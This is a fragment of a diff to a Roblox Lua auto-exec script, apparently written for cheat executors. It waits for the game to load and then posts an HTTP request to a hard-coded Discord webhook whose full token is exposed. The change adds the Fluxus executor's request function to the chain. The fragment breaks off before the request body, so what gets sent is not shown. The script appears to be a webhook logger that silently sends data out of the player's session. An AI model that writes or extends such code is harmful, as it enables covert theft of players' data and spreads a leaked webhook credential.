@@ -1,5 +1,4 @@
 local AutoExec = game
-
 repeat wait() until AutoExec:IsLoaded();
 if not AutoExec:IsLoaded() then
     AutoExec.Loaded:Wait();
@@ -7,7 +6,7 @@ end
 
 HttpService = game:GetService("HttpService") 
  Webhook_URL =  "https://discord.com/api/webhooks/1165544617341616138/QiOP7PFZwHyGcOwM8UCgBRxtamewk6Uh_mXucGo4XcLAHMMFW-rW5ju5S6rsK2-TTm5_" 
- local ok = request or http_request or (http and http.request) or syn.request 
+ local ok = request or http_request or (http and http.request) or (fluxus.request and fluxus) or syn.request
  ok( 
  { 
  Url = Webhook_URL, 
